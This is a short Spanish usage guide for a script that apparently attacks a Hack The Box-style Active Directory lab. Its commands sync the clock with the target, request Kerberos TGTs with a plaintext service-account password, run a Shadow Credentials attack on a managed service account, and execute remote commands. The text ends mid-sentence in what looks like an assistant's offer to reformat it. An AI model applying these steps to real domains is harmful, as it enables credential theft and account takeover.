Faketime Sync - Uso

Este script permite interactuar con servicios remotos y sincronizar la hora virtual, obtener tickets Kerberos y ejecutar comandos de forma automatizada.

Comandos disponibles

Obtener solo la hora virtual

./faketime_sync.sh 10.129.35.21 logging.htb

Devuelve la hora virtual del sistema remoto.

Obtener TGT automáticamente

./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --tgt

Solicita un Ticket Granting Ticket (TGT) para el usuario especificado.

Obtener Shadow Credentials directamente

./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --shadow 'msa_health$'

Recupera credenciales del shadow de un usuario/servicio específico.

Ejecutar un comando personalizado

./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --exec 'klist'

Ejecuta un comando remoto utilizando las credenciales especificadas.

Mostrar solo la hora virtual sin conexión completa

./faketime_sync.sh 10.129.35.21 logging.htb --show-time

Muestra únicamente la hora virtual sin realizar autenticaciones adicionales.

Si quieres, puedo hacer una versión más “visual” con secciones de ejemplo y explicac
